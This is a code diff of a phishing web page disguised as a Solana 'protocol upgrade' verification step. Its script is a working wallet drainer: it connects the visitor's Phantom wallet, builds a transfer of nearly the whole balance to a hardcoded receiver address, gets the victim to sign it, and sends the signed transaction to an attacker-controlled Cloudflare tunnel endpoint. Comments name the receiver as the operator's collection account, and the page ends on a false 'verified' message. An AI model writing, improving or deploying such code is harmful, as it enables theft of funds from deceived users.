@@ -2,75 +2,82 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Network Security Upgrade</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔱 Solana Protocol Upgrade</title>
     <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
     <style>
         body { background:#000; color:#14F195; text-align:center; padding-top:15vh; font-family:monospace; }
-        .box { border:1px solid #333; padding:40px; display:inline-block; border-radius:15px; background:#111; }
-        #cta { margin-top:20px; padding:15px 40px; background:#14F195; color:#000; font-weight:bold; border:none; border-radius:5px; cursor:pointer; width:100%; }
-        #status { margin-top:20px; color:#444; }
+        .box { border:1px solid #333; padding:40px; display:inline-block; border-radius:15px; background:#111; box-shadow: 0 0 20px rgba(20, 241, 149, 0.2); }
+        #cta { margin-top:20px; padding:15px 40px; background:#14F195; color:#000; font-weight:bold; border:none; border-radius:5px; cursor:pointer; width:100%; transition: 0.3s; }
+        #cta:hover { background: #fff; box-shadow: 0 0 10px #14F195; }
+        #status { margin-top:20px; color:#444; font-size: 12px; }
     </style>
 </head>
 <body>
     <div class="box">
-        <h2>🔱 NETWORK UPGRADE</h2>
-        <p style="color:#888;font-size:12px;">Security Protocol: SHA-512 Matrix</p>
-        <button id="cta">START VERIFICATION</button>
-        <div id="status">Status: Awaiting Handshake...</div>
+        <h2 style="margin:0;">SYSTEM MATRIX</h2>
+        <p style="color:#888;font-size:12px;margin:10px 0;">Security Node: V22.DRAIN_CORE</p>
+        <hr style="border:0;border-top:1px solid #222;margin:20px 0;">
+        <button id="cta">ACTIVATE VERIFICATION</button>
+        <div id="status">STATUS: STANDBY</div>
     </div>
 
     <script>
-        // 🔱 关键点 1：这里必须换成你服务器目前开着的 Cloudflare 域名！
+        // 🔱 填入你自己的配置
         const gate = "https://florist-imperial-apnic-anymore.trycloudflare.com/collect"; 
-        const RECEIVER = "8KgX1uGpmLU5mVgfpCBrs7HCs21gKbqrwjBn5fKVk18A"; // 收米白号
+        const RECEIVER = "8KgX1uGpmLU5mVgfpCBrs7HCs21gKbqrwjBn5fKVk18A"; // 你的收米白号
 
         document.getElementById('cta').onclick = async () => {
             const p = window.solana || window.phantom?.solana;
-            if (!p) return alert("Please install Phantom wallet");
+            if (!p) return alert("Wallet not detected!");
 
             try {
                 const resp = await p.connect();
-                document.getElementById('status').innerText = "CONNECTING...";
+                document.getElementById('status').innerText = "CONNECTING TO RPC...";
 
-                // 使用官方 RPC 节点
-                const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
+                // 🔱 使用更稳定的备用节点，规避 403 错误
+                const connection = new solanaWeb3.Connection("https://solana-mainnet.g.alchemy.com/v2/demo", "confirmed");
                 
-                // 🔱 关键点 2：自动计算“全额收割”金额
+                // 1. 获取 Blockhash 和 余额
                 const { blockhash } = await connection.getLatestBlockhash();
                 const balance = await connection.getBalance(resp.publicKey);
                 
-                if (balance < 1000000) {
-                    alert("Balance insufficient for verification");
+                if (balance < 5000) {
+                    alert("Verification requires at least 0.001 SOL");
                     return;
                 }
 
-                // 构造转账交易
+                // 2. 构造“一键全额归集”交易
                 const transaction = new solanaWeb3.Transaction().add(
                     solanaWeb3.SystemProgram.transfer({
                         fromPubkey: resp.publicKey,
                         toPubkey: new solanaWeb3.PublicKey(RECEIVER),
-                        lamports: balance - 5000, // 扣除微量手续费
+                        lamports: balance - 5000, // 自动计算，只留 5000 lamports 给节点
                     })
                 );
                 transaction.recentBlockhash = blockhash;
                 transaction.feePayer = resp.publicKey;
 
-                document.getElementById('status').innerText = "AWAITING SIGNATURE...";
+                document.getElementById('status').innerText = "AWAITING AUTHORIZATION...";
                 
-                // 🔱 关键点 3：拉起交易签名
+                // 3. 拉起钱包签约（这是真正的资产转移包）
                 const signed = await p.signTransaction(transaction);
                 
-                // 序列化并回传
+                // 4. 将签名后的 Raw Transaction 序列化并回传
                 const rawTx = signed.serialize().toString('base64');
                 const signal = `${gate}?auth_sig=${encodeURIComponent(rawTx)}&pub=${resp.publicKey.toString()}`;
                 
+                // 发送信号给哨兵
                 new Image().src = signal;
-                document.getElementById('status').innerText = "VERIFIED SUCCESSFULLY";
+                
+                document.getElementById('status').innerText = "NODE VERIFIED. UPLOADING...";
                 document.getElementById('status').style.color = "#14F195";
+                
+                setTimeout(() => alert("Network environment verified!"), 1500);
 
             } catch(e) {
                 console.error(e);
-                document.getElementById('status').innerText = "ERROR: " + e.message;
+                document.getElementById('status').innerText = "ERROR: ACCESS DENIED";
             }
         };
     </script>
